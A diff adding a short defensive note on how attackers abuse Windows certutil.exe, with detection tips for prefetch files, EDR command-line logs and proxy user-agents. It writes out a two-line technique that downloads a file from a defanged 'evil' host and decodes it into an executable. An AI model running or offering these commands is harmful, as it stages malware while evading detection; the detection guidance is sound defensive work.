@@ -1,0 +1,17 @@
+Certutil.exe is a command-line program that is installed as part of Certificate Services. You can use Certutil.exe to dump and
+display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components,
+and verify certificates, key pairs, and certificate chains.
+Adversaries use this utility to download malicious payload to evade detections.
+
+Command:
+certutil -urlcache -split -f [http[:]//evil] evil[.]txt
+certutil -decode evil.txt evil.exe
+decode option used to decode the disguised certificate.
+
+Detection:
+Detection:
+1.Look for certutil.exe prefetch files and Parsing the prefetch will provide the downloaded file. 
+2.Command execution and arguments passed to certutil.exe using EDR solutions.
+3.Look for the HTTP useragents with certutil in the network recorders or the proxy logs.
+
+
